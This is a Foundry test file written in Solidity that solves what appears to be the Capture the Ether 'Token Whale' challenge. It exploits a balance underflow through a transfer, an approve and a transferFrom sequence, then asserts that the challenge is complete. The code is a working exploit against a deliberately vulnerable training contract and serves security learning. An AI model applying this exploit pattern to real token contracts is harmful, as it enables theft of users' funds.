// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {TokenWhale} from "../src/TokenWhale.sol";

contract TokenSaleTest is Test {
    TokenWhale public tokenWhale;
    address challenger;
    address secondAccount;

    function setUp() public {
        //setup a payable address as a challenger
        challenger = vm.addr(1);
        vm.deal(challenger, 10 ether);

        tokenWhale = new TokenWhale(challenger);
        vm.startPrank(challenger);

        secondAccount = vm.addr(2);
    }

    function test_solution() public {
        tokenWhale.transfer(secondAccount, 600);

        vm.startPrank(secondAccount);
        tokenWhale.approve(challenger, 600);
        vm.stopPrank();

        vm.startPrank(challenger);
        tokenWhale.transferFrom(secondAccount, secondAccount, 600);

//        console.log(tokenWhale.balanceOf(challenger));
//        console.log(tokenWhale.balanceOf(secondAccount));

        assertEq(tokenWhale.isComplete(), true);
    }
}